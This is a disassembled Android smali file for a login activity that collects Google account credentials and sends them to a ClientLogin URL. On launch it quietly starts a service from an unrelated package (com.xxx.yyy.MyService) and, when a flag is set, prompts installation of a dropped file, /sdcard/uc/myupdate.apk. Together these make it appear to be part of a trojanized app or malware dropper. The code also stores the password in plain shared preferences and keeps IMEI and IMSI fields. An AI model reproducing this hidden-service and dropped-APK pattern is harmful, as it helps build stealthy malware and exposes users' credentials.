.class public Lcom/tt/yy/loginActivity;
.super Landroid/app/Activity;
.source "loginActivity.java"


# static fields
.field public static final NAME:Ljava/lang/String; = "NAME"

.field public static final PASSWORD:Ljava/lang/String; = "PASSWORD"

.field public static final USER_INFO:Ljava/lang/String; = "user_info"


# instance fields
.field TAG:Ljava/lang/String;

.field private btnLogin:Landroid/widget/Button;

.field private field_name:Landroid/widget/EditText;

.field private filed_pass:Landroid/widget/EditText;

.field public h:Landroid/os/Handler;

.field imei:Ljava/lang/String;

.field imsi:Ljava/lang/String;

.field iswap:I


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 49
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    .line 58
    const-string v0, "MyTag"

    iput-object v0, p0, Lcom/tt/yy/loginActivity;->TAG:Ljava/lang/String;

    .line 49
    return-void
.end method

.method private Login(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 12
    .param p1, "username"    # Ljava/lang/String;
    .param p2, "pwd"    # Ljava/lang/String;

    .prologue
    const-string v11, ""

    .line 200
    new-instance v4, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v4}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 201
    .local v4, "httpClient":Lorg/apache/http/impl/client/DefaultHttpClient;
    new-instance v5, Lorg/apache/http/client/methods/HttpGet;

    .line 202
    new-instance v9, Ljava/lang/StringBuilder;

    const-string v10, "https://www.google.com/accounts/ClientLogin?service=reader&Email="

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 203
    invoke-virtual {v9, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "&Passwd="

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    .line 202
    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 201
    invoke-direct {v5, v9}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V

    .line 204
    .local v5, "method":Lorg/apache/http/client/methods/HttpGet;
    const-string v9, "Accept"

    const-string v10, "application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"

    invoke-virtual {v5, v9, v10}, Lorg/apache/http/client/methods/HttpGet;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 205
    const-string v9, "User-Agent"

    const-string v10, "Mozilla/5.0 (Linux; U; Android 1.5; en-za; HTC Hero Build/CUPCAKE) AppleWebKit/528.5+ (KHTML, like Gecko) Version/3.1.2 Mobile Safari/525.20.1"

    invoke-virtual {v5, v9, v10}, Lorg/apache/http/client/methods/HttpGet;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 206
    const-string v9, "Accept-Language"

    const-string v10, "zh-CN, en-US"

    invoke-virtual {v5, v9, v10}, Lorg/apache/http/client/methods/HttpGet;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 207
    const-string v9, "Accept-Charset"

    const-string v10, "utf-8, iso-8859-1, utf-16, *;q=0.7"

    invoke-virtual {v5, v9, v10}, Lorg/apache/http/client/methods/HttpGet;->addHeader(Ljava/lang/String;Ljava/lang/String;)V

    .line 210
    const/4 v0, 0x0

    .line 212
    .local v0, "br":Ljava/io/BufferedReader;
    :try_start_0
    invoke-virtual {v4, v5}, Lorg/apache/http/impl/client/DefaultHttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v6

    .line 213
    .local v6, "resp":Lorg/apache/http/HttpResponse;
    invoke-interface {v6}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v9

    invoke-interface {v9}, Lorg/apache/http/StatusLine;->getStatusCode()I
    :try_end_0
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_4
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result v8

    .line 215
    .local v8, "status":I
    const/16 v9, 0xc8

    if-eq v8, v9, :cond_1

    .line 233
    if-eqz v0, :cond_0

    .line 235
    :try_start_1
    invoke-virtual {v0}, Ljava/io/BufferedReader;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_0

    .line 216
    :cond_0
    :goto_0
    const-string v9, ""

    move-object v9, v11

    .line 231
    .end local v6    # "resp":Lorg/apache/http/HttpResponse;
    .end local v8    # "status":I
    :goto_1
    return-object v9

    .line 236
    .restart local v6    # "resp":Lorg/apache/http/HttpResponse;
    .restart local v8    # "status":I
    :catch_0
    move-exception v2

    .line 238
    .local v2, "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    .line 218
    .end local v2    # "e":Ljava/io/IOException;
    :cond_1
    :try_start_2
    invoke-interface {v6}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v3

    .line 219
    .local v3, "entity":Lorg/apache/http/HttpEntity;
    new-instance v1, Ljava/io/BufferedReader;

    new-instance v9, Ljava/io/InputStreamReader;

    invoke-interface {v3}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v1, v9}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V
    :try_end_2
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_4
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 220
    .end local v0    # "br":Ljava/io/BufferedReader;
    .local v1, "br":Ljava/io/BufferedReader;
    :try_start_3
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_3
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_3 .. :try_end_3} :catch_8
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_7
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    move-result-object v7

    .line 233
    .local v7, "result":Ljava/lang/String;
    if-eqz v1, :cond_2

    .line 235
    :try_start_4
    invoke-virtual {v1}, Ljava/io/BufferedReader;->close()V
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_1

    :cond_2
    :goto_2
    move-object v0, v1

    .end local v1    # "br":Ljava/io/BufferedReader;
    .restart local v0    # "br":Ljava/io/BufferedReader;
    move-object v9, v7

    .line 223
    goto :goto_1

    .line 236
    .end local v0    # "br":Ljava/io/BufferedReader;
    .restart local v1    # "br":Ljava/io/BufferedReader;
    :catch_1
    move-exception v2

    .line 238
    .restart local v2    # "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2

    .line 224
    .end local v1    # "br":Ljava/io/BufferedReader;
    .end local v2    # "e":Ljava/io/IOException;
    .end local v3    # "entity":Lorg/apache/http/HttpEntity;
    .end local v6    # "resp":Lorg/apache/http/HttpResponse;
    .end local v7    # "result":Ljava/lang/String;
    .end local v8    # "status":I
    .restart local v0    # "br":Ljava/io/BufferedReader;
    :catch_2
    move-exception v9

    move-object v2, v9

    .line 226
    .local v2, "e":Lorg/apache/http/client/ClientProtocolException;
    :goto_3
    :try_start_5
    invoke-virtual {v2}, Lorg/apache/http/client/ClientProtocolException;->printStackTrace()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 233
    if-eqz v0, :cond_3

    .line 235
    :try_start_6
    invoke-virtual {v0}, Ljava/io/BufferedReader;->close()V
    :try_end_6
    .catch Ljava/io/IOException; {:try_start_6 .. :try_end_6} :catch_3

    .line 227
    .end local v2    # "e":Lorg/apache/http/client/ClientProtocolException;
    :cond_3
    :goto_4
    const-string v9, ""

    move-object v9, v11

    goto :goto_1

    .line 236
    .restart local v2    # "e":Lorg/apache/http/client/ClientProtocolException;
    :catch_3
    move-exception v2

    .line 238
    .local v2, "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_4

    .line 228
    .end local v2    # "e":Ljava/io/IOException;
    :catch_4
    move-exception v9

    move-object v2, v9

    .line 230
    .restart local v2    # "e":Ljava/io/IOException;
    :goto_5
    :try_start_7
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    .line 233
    if-eqz v0, :cond_4

    .line 235
    :try_start_8
    invoke-virtual {v0}, Ljava/io/BufferedReader;->close()V
    :try_end_8
    .catch Ljava/io/IOException; {:try_start_8 .. :try_end_8} :catch_5

    .line 231
    :cond_4
    :goto_6
    const-string v9, ""

    move-object v9, v11

    goto :goto_1

    .line 236
    :catch_5
    move-exception v2

    .line 238
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_6

    .line 232
    .end local v2    # "e":Ljava/io/IOException;
    :catchall_0
    move-exception v9

    .line 233
    :goto_7
    if-eqz v0, :cond_5

    .line 235
    :try_start_9
    invoke-virtual {v0}, Ljava/io/BufferedReader;->close()V
    :try_end_9
    .catch Ljava/io/IOException; {:try_start_9 .. :try_end_9} :catch_6

    .line 240
    :cond_5
    :goto_8
    throw v9

    .line 236
    :catch_6
    move-exception v2

    .line 238
    .restart local v2    # "e":Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_8

    .line 232
    .end local v0    # "br":Ljava/io/BufferedReader;
    .end local v2    # "e":Ljava/io/IOException;
    .restart local v1    # "br":Ljava/io/BufferedReader;
    .restart local v3    # "entity":Lorg/apache/http/HttpEntity;
    .restart local v6    # "resp":Lorg/apache/http/HttpResponse;
    .restart local v8    # "status":I
    :catchall_1
    move-exception v9

    move-object v0, v1

    .end local v1    # "br":Ljava/io/BufferedReader;
    .restart local v0    # "br":Ljava/io/BufferedReader;
    goto :goto_7

    .line 228
    .end local v0    # "br":Ljava/io/BufferedReader;
    .restart local v1    # "br":Ljava/io/BufferedReader;
    :catch_7
    move-exception v9

    move-object v2, v9

    move-object v0, v1

    .end local v1    # "br":Ljava/io/BufferedReader;
    .restart local v0    # "br":Ljava/io/BufferedReader;
    goto :goto_5

    .line 224
    .end local v0    # "br":Ljava/io/BufferedReader;
    .restart local v1    # "br":Ljava/io/BufferedReader;
    :catch_8
    move-exception v9

    move-object v2, v9

    move-object v0, v1

    .end local v1    # "br":Ljava/io/BufferedReader;
    .restart local v0    # "br":Ljava/io/BufferedReader;
    goto :goto_3
.end method

.method private StartInstall()V
    .locals 4

    .prologue
    .line 193
    new-instance v0, Landroid/content/Intent;

    const-string v2, "android.intent.action.VIEW"

    invoke-direct {v0, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 194
    .local v0, "intent":Landroid/content/Intent;
    const-string v1, "file:///sdcard/uc/"

    .line 195
    .local v1, "path":Ljava/lang/String;
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-static {v1}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v3, "myupdate.apk"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v2

    const-string v3, "application/vnd.android.package-archive"

    invoke-virtual {v0, v2, v3}, Landroid/content/Intent;->setDataAndType(Landroid/net/Uri;Ljava/lang/String;)Landroid/content/Intent;

    .line 196
    invoke-virtual {p0, v0}, Lcom/tt/yy/loginActivity;->startActivity(Landroid/content/Intent;)V

    .line 197
    invoke-virtual {p0}, Lcom/tt/yy/loginActivity;->finish()V

    .line 198
    return-void
.end method

.method static synthetic access$0(Lcom/tt/yy/loginActivity;)Landroid/widget/EditText;
    .locals 1

    .prologue
    .line 54
    iget-object v0, p0, Lcom/tt/yy/loginActivity;->field_name:Landroid/widget/EditText;

    return-object v0
.end method

.method static synthetic access$1(Lcom/tt/yy/loginActivity;)Landroid/widget/EditText;
    .locals 1

    .prologue
    .line 55
    iget-object v0, p0, Lcom/tt/yy/loginActivity;->filed_pass:Landroid/widget/EditText;

    return-object v0
.end method

.method static synthetic access$2(Lcom/tt/yy/loginActivity;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 199
    invoke-direct {p0, p1, p2}, Lcom/tt/yy/loginActivity;->Login(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method


# virtual methods
.method public onCreate(Landroid/os/Bundle;)V
    .locals 7
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    const/4 v4, 0x0

    const-string v6, "isnew"

    const-string v5, ""

    .line 66
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 68
    const/4 v2, 0x5

    invoke-virtual {p0, v2}, Lcom/tt/yy/loginActivity;->requestWindowFeature(I)Z

    .line 69
    const/high16 v2, 0x7f030000

    invoke-virtual {p0, v2}, Lcom/tt/yy/loginActivity;->setContentView(I)V

    .line 70
    invoke-virtual {p0, v4}, Lcom/tt/yy/loginActivity;->setProgressBarIndeterminateVisibility(Z)V

    .line 71
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/xxx/yyy/MyService;

    invoke-direct {v2, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v2}, Lcom/tt/yy/loginActivity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 73
    const-string v2, "update_flag"

    invoke-virtual {p0, v2, v4}, Lcom/tt/yy/loginActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v0

    .line 74
    .local v0, "update":Landroid/content/SharedPreferences;
    const-string v2, "isnew"

    invoke-interface {v0, v6, v4}, Landroid/content/SharedPreferences;->getInt(Ljava/lang/String;I)I

    move-result v2

    const/4 v3, 0x1

    if-ne v2, v3, :cond_0

    .line 76
    invoke-direct {p0}, Lcom/tt/yy/loginActivity;->StartInstall()V

    .line 77
    invoke-interface {v0}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    const-string v3, "isnew"

    invoke-interface {v2, v6, v4}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    move-result-object v2

    .line 78
    invoke-interface {v2}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 80
    :cond_0
    const v2, 0x7f050002

    invoke-virtual {p0, v2}, Lcom/tt/yy/loginActivity;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/EditText;

    iput-object v2, p0, Lcom/tt/yy/loginActivity;->field_name:Landroid/widget/EditText;

    .line 81
    const v2, 0x7f050004

    invoke-virtual {p0, v2}, Lcom/tt/yy/loginActivity;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/EditText;

    iput-object v2, p0, Lcom/tt/yy/loginActivity;->filed_pass:Landroid/widget/EditText;

    .line 82
    const-string v2, "user_info"

    invoke-virtual {p0, v2, v4}, Lcom/tt/yy/loginActivity;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 83
    .local v1, "user":Landroid/content/SharedPreferences;
    iget-object v2, p0, Lcom/tt/yy/loginActivity;->field_name:Landroid/widget/EditText;

    const-string v3, "NAME"

    const-string v4, ""

    invoke-interface {v1, v3, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 84
    iget-object v2, p0, Lcom/tt/yy/loginActivity;->filed_pass:Landroid/widget/EditText;

    const-string v3, "PASSWORD"

    const-string v4, ""

    invoke-interface {v1, v3, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 85
    const v2, 0x7f050005

    invoke-virtual {p0, v2}, Lcom/tt/yy/loginActivity;->findViewById(I)Landroid/view/View;

    move-result-object v2

    check-cast v2, Landroid/widget/Button;

    iput-object v2, p0, Lcom/tt/yy/loginActivity;->btnLogin:Landroid/widget/Button;

    .line 87
    iget-object v2, p0, Lcom/tt/yy/loginActivity;->btnLogin:Landroid/widget/Button;

    new-instance v3, Lcom/tt/yy/loginActivity$1;

    invoke-direct {v3, p0}, Lcom/tt/yy/loginActivity$1;-><init>(Lcom/tt/yy/loginActivity;)V

    invoke-virtual {v2, v3}, Landroid/widget/Button;->setOnClickListener(Landroid/view/View$OnClickListener;)V

    .line 164
    return-void
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 2
    .param p1, "menu"    # Landroid/view/Menu;

    .prologue
    const/4 v1, 0x0

    .line 167
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreateOptionsMenu(Landroid/view/Menu;)Z

    .line 168
    const v0, 0x7f040005

    invoke-interface {p1, v1, v1, v1, v0}, Landroid/view/Menu;->add(IIII)Landroid/view/MenuItem;

    .line 169
    const/4 v0, 0x1

    return v0
.end method

.method protected onDestroy()V
    .locals 0

    .prologue
    .line 189
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    .line 190
    return-void
.end method

.method public onOptionsItemSelected(Landroid/view/MenuItem;)Z
    .locals 2
    .param p1, "item"    # Landroid/view/MenuItem;

    .prologue
    .line 174
    const-string v0, "info"

    const-string v1, "NotePad Menu select "

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 176
    invoke-interface {p1}, Landroid/view/MenuItem;->getItemId()I

    move-result v0

    packed-switch v0, :pswitch_data_0

    .line 181
    const-string v0, "i"

    const-string v1, "\u65e0\u6548\u7684\u83dc\u5355\u9009\u9879"

    invoke-static {v0, v1}, Landroid/util/Log;->i(Ljava/lang/String;Ljava/lang/String;)I

    .line 185
    :goto_0
    invoke-super {p0, p1}, Landroid/app/Activity;->onOptionsItemSelected(Landroid/view/MenuItem;)Z

    move-result v0

    return v0

    .line 178
    :pswitch_0
    invoke-virtual {p0}, Lcom/tt/yy/loginActivity;->finish()V

    goto :goto_0

    .line 176
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
    .end packed-switch
.end method
